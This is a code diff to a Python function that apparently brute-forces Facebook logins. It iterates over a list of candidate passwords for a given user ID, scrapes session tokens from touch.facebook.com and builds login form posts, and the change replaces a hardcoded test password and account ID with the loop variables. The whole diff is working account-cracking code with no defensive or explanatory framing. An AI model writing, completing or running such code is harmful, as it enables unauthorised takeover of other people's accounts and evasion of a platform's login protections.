@@ -1206,7 +1206,7 @@ def mbasic(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            password = '767980'
+            password = pw
             web_encryptor = Encrypt_PWD_Web()
             web_token = web_encryptor.PWD_BROWSER(password)
             free_fb = Session.get('https://touch.facebook.com').text
@@ -1215,7 +1215,7 @@ def mbasic(uid,pwx,tl):
             "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
             "try_number": "0",
             "unrecognized_tries": "0",
-            "email": '100078110812030',
+            "email": uid,
             "prefill_contact_point": uid,
             "prefill_source": "browser_dropdown",
             "prefill_type": "password",
@@ -1225,7 +1225,7 @@ def mbasic(uid,pwx,tl):
             "had_password_prefilled": "true",
             "is_smart_lock": "false",
             "bi_xrwh": "92004344361786634",
-            "encpass": web_token,
+            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             "fb_dtsg": "NAfup2Me3JHXJFN2yxBY35qKn-1LtNpMqJhQzaJ3AqYbs8PMFOvFhGw:0:0",
             "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
